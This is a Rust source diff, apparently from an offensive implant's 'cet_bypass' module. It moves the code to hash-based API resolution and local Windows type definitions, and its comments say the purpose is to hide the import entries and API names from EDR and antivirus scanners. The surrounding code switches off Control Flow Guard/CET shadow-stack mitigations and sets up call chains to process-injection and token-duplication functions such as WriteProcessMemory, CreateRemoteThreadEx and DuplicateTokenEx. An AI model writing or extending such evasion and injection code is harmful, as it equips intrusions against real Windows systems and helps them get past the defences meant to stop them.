@@ -45,15 +45,129 @@
 use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
 use once_cell::sync::OnceLock;
 
-// GetProcessMitigationPolicy/SetProcessMitigationPolicy/GetCurrentProcess removed
-// — using dynamic resolution via pe_resolve and pseudo-handle (-1)
-use winapi::um::winnt::{
-    PROCESS_MITIGATION_POLICY, PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY,
-    ProcessControlFlowGuardPolicy,
-};
-use winapi::shared::ntdef::{PVOID, HANDLE};
-use winapi::shared::minwindef::{DWORD, BOOL};
-use winapi::shared::basetsd::SIZE_T;
+// Local Windows ABI type definitions — avoids winapi static imports that produce
+// IAT entries visible to EDR/AV scanners.  All layouts match the Windows x64 ABI.
+
+type PVOID = *mut std::ffi::c_void;
+type HANDLE = PVOID;
+type DWORD = u32;
+type BOOL = i32;
+type SIZE_T = usize;
+
+/// ProcessMitigationPolicy enumeration value.
+/// This is a u32 representing the `ProcessMitigationPolicy` enum.
+type ProcessMitigationPolicy = u32;
+
+/// Policy class for Control Flow Guard (value 7).
+const ProcessControlFlowGuardPolicy: ProcessMitigationPolicy = 7;
+
+/// CFG mitigation policy structure (matches Windows x64 ABI).
+#[repr(C)]
+#[derive(Clone, Copy, Default)]
+struct ProcessMitigationControlFlowGuardPolicy {
+    Flags: DWORD,
+}
+
+// Static assertions: ensure local type layouts match the Windows ABI.
+// These are verified against the winapi crate definitions.
+const _: () = assert!(std::mem::size_of::<PVOID>() == 8);
+const _: () = assert!(std::mem::size_of::<HANDLE>() == 8);
+const _: () = assert!(std::mem::size_of::<DWORD>() == 4);
+const _: () = assert!(std::mem::size_of::<BOOL>() == 4);
+const _: () = assert!(std::mem::size_of::<SIZE_T>() == 8);
+const _: () = assert!(std::mem::size_of::<ProcessMitigationControlFlowGuardPolicy>() == 4);
+const _: () = assert!(std::mem::align_of::<ProcessMitigationControlFlowGuardPolicy>() == 4);
+
+// ─── Const Hash Functions ─────────────────────────────────────────────────
+//
+// Const-compatible versions of pe_resolve::hash_str / hash_wstr so that
+// CALL_CHAINS hash values can be computed at compile time, avoiding any
+// plaintext DLL/function name strings in the binary.
+
+/// Compile-time rotational hash of a UTF-8 byte string (null-terminated).
+/// Mirrors `pe_resolve::hash_str` exactly.
+const fn const_hash_str(bytes: &[u8]) -> u32 {
+    let mut hash: u32 = pe_resolve::SEED;
+    let mut i = 0;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if b == 0 {
+            break;
+        }
+        let lower = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
+        hash = hash.rotate_right(13) ^ (lower as u32);
+        i += 1;
+    }
+    hash
+}
+
+/// Compile-time rotational hash of a UTF-16LE wide string (null-terminated).
+/// Mirrors `pe_resolve::hash_wstr` exactly.
+const fn const_hash_wstr(units: &[u16]) -> u32 {
+    let mut hash: u32 = pe_resolve::SEED;
+    let mut i = 0;
+    while i < units.len() {
+        let c = units[i];
+        if c == 0 {
+            break;
+        }
+        let lo = c as u8;
+        let lo = if lo >= b'A' && lo <= b'Z' { lo + 32 } else { lo };
+        let hi = (c >> 8) as u8;
+        let hi = if hi >= b'A' && hi <= b'Z' { hi + 32 } else { hi };
+        hash = hash.rotate_right(13) ^ (lo as u32);
+        hash = hash.rotate_right(13) ^ (hi as u32);
+        i += 1;
+    }
+    hash
+}
+
+// ─── Minimal VEH Types ────────────────────────────────────────────────────
+//
+// Local definitions of EXCEPTION_POINTERS and related structures for the
+// VEH shadow-stack handler.  Avoids importing winapi::um::winnt types.
+
+/// Maximum number of exception parameters.
+const EXCEPTION_MAXIMUM_PARAMETERS: usize = 15;
+
+/// Windows x64 EXCEPTION_RECORD (matches winnt.h layout).
+#[cfg(feature = "kernel-callback")]
+#[repr(C)]
+struct ExceptionRecord {
+    ExceptionCode: DWORD,
+    ExceptionFlags: DWORD,
+    ExceptionRecord: *mut ExceptionRecord,
+    ExceptionAddress: PVOID,
+    NumberParameters: DWORD,
+    ExceptionInformation: [usize; EXCEPTION_MAXIMUM_PARAMETERS],
+}
+
+/// Windows x64 CONTEXT structure (minimal — only Rip and Rsp fields).
+#[cfg(feature = "kernel-callback")]
+#[repr(C)]
+struct Context {
+    _pad: [u8; 0x98],         // offset 0x00 – 0x97: P1Home..Rbp
+    Rsp: u64,                  // offset 0x98
+    _pad2: [u8; 0xF80 - 0xA0], // offset 0xA0 – 0xF7F: Rsi..FltSave
+    Rip: u64,                  // offset 0xF80
+    _pad3: [u8; 0x4D0],        // remaining CONTEXT fields
+}
+
+/// Windows EXCEPTION_POINTERS.
+#[cfg(feature = "kernel-callback")]
+#[repr(C)]
+struct ExceptionPointers {
+    ExceptionRecord: *mut ExceptionRecord,
+    ContextRecord: *mut Context,
+}
+
+// Static assertions for VEH types.
+#[cfg(feature = "kernel-callback")]
+const _: () = assert!(std::mem::size_of::<ExceptionRecord>() >= 4 + 4 + 8 + 8 + 4 + 8 * EXCEPTION_MAXIMUM_PARAMETERS);
+#[cfg(feature = "kernel-callback")]
+const _: () = assert!(std::mem::offset_of!(Context, Rsp) == 0x98);
+#[cfg(feature = "kernel-callback")]
+const _: () = assert!(std::mem::offset_of!(Context, Rip) == 0xF80);
 
 // ─── Constants ────────────────────────────────────────────────────────────
 
@@ -320,11 +434,11 @@ fn detect_cet_state() {
 
     // Query the CFG mitigation policy.  If CFG is enabled, CET shadow
     // stacks are also active (they are tied together on Win11 24H2+).
-    let mut cfg_policy = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };
+    let mut cfg_policy = ProcessMitigationControlFlowGuardPolicy { Flags: 0 };
 
     // Resolve GetProcessMitigationPolicy dynamically to avoid IAT entry.
     type FnGetProcessMitigationPolicy = unsafe extern "system" fn(
-        HANDLE, PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
+        HANDLE, ProcessMitigationPolicy, PVOID, SIZE_T,
     ) -> BOOL;
     let get_policy_fn: Option<FnGetProcessMitigationPolicy> = {
         let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
@@ -352,7 +466,7 @@ fn detect_cet_state() {
             (-1isize) as *mut _,
             ProcessControlFlowGuardPolicy,
             &mut cfg_policy as *mut _ as PVOID,
-            std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
+            std::mem::size_of::<ProcessMitigationControlFlowGuardPolicy>() as SIZE_T,
         )
     };
 
@@ -399,14 +513,14 @@ fn can_disable_cet_policy() -> bool {
     // On newer Windows, SetProcessMitigationPolicy for CFG can succeed
     // only if the process has the right to change mitigation policies.
     // We test by trying to set the current policy (a no-op write).
-    let mut current = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };
+    let mut current = ProcessMitigationControlFlowGuardPolicy { Flags: 0 };
 
     // Resolve APIs dynamically.
     type FnGetPolicy = unsafe extern "system" fn(
-        HANDLE, PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
+        HANDLE, ProcessMitigationPolicy, PVOID, SIZE_T,
     ) -> BOOL;
     type FnSetPolicy = unsafe extern "system" fn(
-        PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
+        ProcessMitigationPolicy, PVOID, SIZE_T,
     ) -> BOOL;
 
     let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL);
@@ -437,7 +551,7 @@ fn can_disable_cet_policy() -> bool {
             (-1isize) as *mut _,
             ProcessControlFlowGuardPolicy,
             &mut current as *mut _ as PVOID,
-            std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
+            std::mem::size_of::<ProcessMitigationControlFlowGuardPolicy>() as SIZE_T,
         )
     };
 
@@ -451,7 +565,7 @@ fn can_disable_cet_policy() -> bool {
         set_fn(
             ProcessControlFlowGuardPolicy,
             &current as *const _ as PVOID,
-            std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
+            std::mem::size_of::<ProcessMitigationControlFlowGuardPolicy>() as SIZE_T,
         )
     };
 
@@ -496,7 +610,7 @@ fn disable_cet_for_process(handle: HANDLE) -> bool {
     if is_self {
         // Dynamically resolve SetProcessMitigationPolicy to avoid IAT entry.
         type FnSetPolicy = unsafe extern "system" fn(
-            PROCESS_MITIGATION_POLICY, PVOID, SIZE_T,
+            ProcessMitigationPolicy, PVOID, SIZE_T,
         ) -> BOOL;
 
         let set_fn: Option<FnSetPolicy> = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
@@ -514,13 +628,13 @@ fn disable_cet_for_process(handle: HANDLE) -> bool {
             }
         };
 
-        let zero_policy = PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 };
+        let zero_policy = ProcessMitigationControlFlowGuardPolicy { Flags: 0 };
 
         let result = unsafe {
             set_fn(
                 ProcessControlFlowGuardPolicy,
                 &zero_policy as *const _ as PVOID,
-                std::mem::size_of::<PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY>() as SIZE_T,
+                std::mem::size_of::<ProcessMitigationControlFlowGuardPolicy>() as SIZE_T,
             )
         };
 
@@ -543,7 +657,7 @@ fn disable_cet_for_process(handle: HANDLE) -> bool {
 /// Disable CET for a process via `NtSetInformationProcess` indirect syscall.
 ///
 /// Uses the `ProcessMitigationPolicy` information class (0x36) with a
-/// `PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY` structure that has all
+/// `ProcessMitigationControlFlowGuardPolicy` structure that has all
 /// flags cleared.
 fn disable_cet_nt(handle: HANDLE) -> bool {
     // NtSetInformationProcess information classes:
@@ -559,7 +673,7 @@ fn disable_cet_nt(handle: HANDLE) -> bool {
     // Build the mitigation policy input buffer for NtSetInformationProcess.
     // The input buffer for ProcessMitigationPolicy is:
     //   struct {
-    //       PROCESS_MITIGATION_POLICY PolicyClass; // offset 0
+    //       ProcessMitigationPolicy PolicyClass; // offset 0
     //       DWORD Reserved;                         // offset 4
     //       BYTE PolicyData[...];                   // offset 8
     //   }
@@ -568,15 +682,15 @@ fn disable_cet_nt(handle: HANDLE) -> bool {
 
     #[repr(C)]
     struct MitigationPolicyInput {
-        policy_class: PROCESS_MITIGATION_POLICY, // DWORD
+        policy_class: ProcessMitigationPolicy, // DWORD
         reserved: DWORD,
-        policy_data: PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY,
+        policy_data: ProcessMitigationControlFlowGuardPolicy,
     }
 
     let input = MitigationPolicyInput {
         policy_class: ProcessControlFlowGuardPolicy,
         reserved: 0,
-        policy_data: PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY { Flags: 0 },
+        policy_data: ProcessMitigationControlFlowGuardPolicy { Flags: 0 },
     };
 
     let input_size = std::mem::size_of::<MitigationPolicyInput>() as u32;
@@ -625,18 +739,45 @@ fn disable_cet_nt(handle: HANDLE) -> bool {
 /// to build a CET-compatible call stack.  Each step represents a `call`
 /// instruction that pushes a valid return address onto both the regular
 /// and shadow stacks.
-#[derive(Debug, Clone)]
+///
+/// Uses pre-computed pe_resolve hashes for DLL and function resolution,
+/// avoiding any plaintext name strings in the binary.
+#[derive(Debug, Clone, Copy)]
 pub struct CallChainStep {
-    /// The DLL name containing the function (e.g., "kernel32.dll").
-    pub dll_name: &'static str,
-    /// The function name (e.g., "WriteProcessMemory").
-    pub func_name: &'static str,
-    /// Whether this function ultimately calls the target NT API.
-    pub reaches_target: bool,
+    /// pe_resolve hash of the DLL wide-string name (e.g., kernel32.dll).
+    pub dll_hash: u32,
+    /// pe_resolve hash of the exported function name (e.g., WriteProcessMemory).
+    pub func_hash: u32,
     /// Number of arguments the kernel32 wrapper expects.
     /// Used to select the correct transmute signature.
     pub arg_count: usize,
 }
+
+// ─── Pre-computed DLL wide-string hashes ────────────────────────────────────
+
+const KERNEL32_DLL_HASH: u32 = const_hash_wstr(&[
+    b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16,
+    b'e' as u16, b'l' as u16, b'3' as u16, b'2' as u16,
+    b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+]);
+const ADVAPI32_DLL_HASH: u32 = const_hash_wstr(&[
+    b'a' as u16, b'd' as u16, b'v' as u16, b'a' as u16,
+    b'p' as u16, b'i' as u16, b'3' as u16, b'2' as u16,
+    b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+]);
+
+// ─── Pre-computed function name hashes ──────────────────────────────────────
+
+const HASH_WRITEPROCESSMEMORY: u32 = const_hash_str(b"WriteProcessMemory");
+const HASH_READPROCESSMEMORY: u32 = const_hash_str(b"ReadProcessMemory");
+const HASH_VIRTUALALLOCEX: u32 = const_hash_str(b"VirtualAllocEx");
+const HASH_VIRTUALFREEEX: u32 = const_hash_str(b"VirtualFreeEx");
+const HASH_VIRTUALPROTECTEX: u32 = const_hash_str(b"VirtualProtectEx");
+const HASH_OPENPROCESS: u32 = const_hash_str(b"OpenProcess");
+const HASH_CLOSEHANDLE: u32 = const_hash_str(b"CloseHandle");
+const HASH_VIRTUALQUERYEX: u32 = const_hash_str(b"VirtualQueryEx");
+const HASH_CREATEREMOTETHREADEX: u32 = const_hash_str(b"CreateRemoteThreadEx");
+const HASH_DUPLICATETOKENEX: u32 = const_hash_str(b"DuplicateTokenEx");
 
 /// Pre-built call chains for common NT API targets.
 ///
@@ -644,120 +785,99 @@ pub struct CallChainStep {
 /// each `call` instruction pushes a valid shadow-stack entry.  The final
 /// call in the chain reaches the target NT API through normal call flow.
 ///
-/// Each `CallChainStep` records the expected argument count so that
-/// `call_via_chain` can dispatch through the correct function-pointer
-/// signature.
+/// Each `CallChainStep` stores pre-computed DLL/function hashes (matching
+/// the pe_resolve SEED) rather than plaintext strings, so no DLL or API
+/// names appear in the binary's static data.
 pub static CALL_CHAINS: once_cell::sync::Lazy<std::collections::HashMap<&'static str, Vec<CallChainStep>>> =
     once_cell::sync::Lazy::new(|| {
         let mut m = std::collections::HashMap::new();
 
-        // NtWriteVirtualMemory ← kernel32!WriteProcessMemory (5 args)
         m.insert(
             "NtWriteVirtualMemory",
             vec![CallChainStep {
-                dll_name: "kernel32.dll",
-                func_name: "WriteProcessMemory",
-                reaches_target: true,
+                dll_hash: KERNEL32_DLL_HASH,
+                func_hash: HASH_WRITEPROCESSMEMORY,
                 arg_count: 5,
             }],
         );
 
-        // NtReadVirtualMemory ← kernel32!ReadProcessMemory (5 args)
         m.insert(
             "NtReadVirtualMemory",
             vec![CallChainStep {
-                dll_name: "kernel32.dll",
-                func_name: "ReadProcessMemory",
-                reaches_target: true,
+                dll_hash: KERNEL32_DLL_HASH,
+                func_hash: HASH_READPROCESSMEMORY,
                 arg_count: 5,
             }],
         );
 
-        // NtAllocateVirtualMemory ← kernel32!VirtualAllocEx (5 args)
         m.insert(
             "NtAllocateVirtualMemory",
             vec![CallChainStep {
-                dll_name: "kernel32.dll",
-                func_name: "VirtualAllocEx",
-                reaches_target: true,
+                dll_hash: KERNEL32_DLL_HASH,
+                func_hash: HASH_VIRTUALALLOCEX,
                 arg_count: 5,
             }],
         );
 
-        // NtFreeVirtualMemory ← kernel32!VirtualFreeEx (4 args)
         m.insert(
             "NtFreeVirtualMemory",
             vec![CallChainStep {
-                dll_name: "kernel32.dll",
-                func_name: "VirtualFreeEx",
-                reaches_target: true,
+                dll_hash: KERNEL32_DLL_HASH,
+                func_hash: HASH_VIRTUALFREEEX,
                 arg_count: 4,
             }],
         );
 
-        // NtProtectVirtualMemory ← kernel32!VirtualProtectEx (5 args)
         m.insert(
             "NtProtectVirtualMemory",
             vec![CallChainStep {
-                dll_name: "kernel32.dll",
-                func_name: "VirtualProtectEx",
-                reaches_target: true,
+                dll_hash: KERNEL32_DLL_HASH,
+                func_hash: HASH_VIRTUALPROTECTEX,
                 arg_count: 5,
             }],
         );
 
-        // NtOpenProcess ← kernel32!OpenProcess (3 args)
         m.insert(
             "NtOpenProcess",
             vec![CallChainStep {
-                dll_name: "kernel32.dll",
-                func_name: "OpenProcess",
-                reaches_target: true,
+                dll_hash: KERNEL32_DLL_HASH,
+                func_hash: HASH_OPENPROCESS,
                 arg_count: 3,
             }],
         );
 
-        // NtClose ← kernel32!CloseHandle (1 arg)
         m.insert(
             "NtClose",
             vec![CallChainStep {
-                dll_name: "kernel32.dll",
-                func_name: "CloseHandle",
-                reaches_target: true,
+                dll_hash: KERNEL32_DLL_HASH,
+                func_hash: HASH_CLOSEHANDLE,
                 arg_count: 1,
             }],
         );
 
-        // NtQueryVirtualMemory ← kernel32!VirtualQueryEx (4 args)
         m.insert(
             "NtQueryVirtualMemory",
             vec![CallChainStep {
-                dll_name: "kernel32.dll",
-                func_name: "VirtualQueryEx",
-                reaches_target: true,
+                dll_hash: KERNEL32_DLL_HASH,
+                func_hash: HASH_VIRTUALQUERYEX,
                 arg_count: 4,
             }],
         );
 
-        // NtCreateThreadEx ← kernel32!CreateRemoteThreadEx (6 args for
-        // the first 6 of 9+ params we actually forward)
         m.insert(
             "NtCreateThreadEx",
             vec![CallChainStep {
-                dll_name: "kernel32.dll",
-                func_name: "CreateRemoteThreadEx",
-                reaches_target: true,
+                dll_hash: KERNEL32_DLL_HASH,
+                func_hash: HASH_CREATEREMOTETHREADEX,
                 arg_count: 6,
             }],
         );
 
-        // NtDuplicateToken ← advapi32!DuplicateTokenEx (5 args)
         m.insert(
             "NtDuplicateToken",
             vec![CallChainStep {
-                dll_name: "advapi32.dll",
-                func_name: "DuplicateTokenEx",
-                reaches_target: true,
+                dll_hash: ADVAPI32_DLL_HASH,
+                func_hash: HASH_DUPLICATETOKENEX,
                 arg_count: 5,
             }],
         );
@@ -789,32 +909,25 @@ pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
 
     let step = &chain[0];
 
-    // Resolve the DLL base and function address via pe_resolve hash-based
-    // lookup.  This avoids depending on the clean-DLL mapping in syscalls
-    // and works purely from the PEB loader data of already-loaded modules.
-    let dll_hash = pe_resolve::hash_wstr(
-        &step.dll_name.encode_utf16().collect::<Vec<u16>>(),
-    );
-    let func_hash = pe_resolve::hash_str(step.func_name.as_bytes());
-
-    let dll_base = match unsafe { pe_resolve::get_module_handle_by_hash(dll_hash) } {
+    // Resolve the DLL base and function address directly from the
+    // pre-computed hashes.  No plaintext strings involved.
+    let dll_base = match unsafe { pe_resolve::get_module_handle_by_hash(step.dll_hash) } {
         Some(b) => b,
         None => {
             log::warn!(
-                "cet_bypass: could not resolve module {} by hash",
-                step.dll_name,
+                "cet_bypass: could not resolve module by hash {:#010X}",
+                step.dll_hash,
             );
             return None;
         }
     };
 
-    let func_addr = match unsafe { pe_resolve::get_proc_address_by_hash(dll_base, func_hash) } {
+    let func_addr = match unsafe { pe_resolve::get_proc_address_by_hash(dll_base, step.func_hash) } {
         Some(a) => a,
         None => {
             log::warn!(
-                "cet_bypass: could not resolve {}!{} by hash",
-                step.dll_name,
-                step.func_name,
+                "cet_bypass: could not resolve function by hash {:#010X}",
+                step.func_hash,
             );
             return None;
         }
@@ -893,10 +1006,10 @@ pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
             }
             n => {
                 log::warn!(
-                    "cet_bypass: unsupported arg_count {} for {}!{}",
+                    "cet_bypass: unsupported arg_count {} for dll_hash={:#010X} func_hash={:#010X}",
                     n,
-                    step.dll_name,
-                    step.func_name,
+                    step.dll_hash,
+                    step.func_hash,
                 );
                 return None;
             }
@@ -1284,7 +1397,7 @@ fn resolve_current_kthread(
 /// EXCEPTION_CONTINUE_SEARCH (which will crash — safer than corrupting memory).
 #[cfg(feature = "kernel-callback")]
 unsafe extern "system" fn veh_shadow_stack_handler(
-    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
+    exception_info: *mut ExceptionPointers,
 ) -> i32 {
     let ep = match exception_info.as_ref() {
         Some(p) => p,
@@ -1476,7 +1589,7 @@ fn install_veh_shadow_fix() {
     };
 
     type FnAddVectoredExceptionHandler =
-        unsafe extern "system" fn(u32, unsafe extern "system" fn(*mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32) -> *mut std::ffi::c_void;
+        unsafe extern "system" fn(u32, unsafe extern "system" fn(*mut ExceptionPointers) -> i32) -> *mut std::ffi::c_void;
 
     let add_veh: FnAddVectoredExceptionHandler = unsafe { std::mem::transmute(fn_addr) };
 
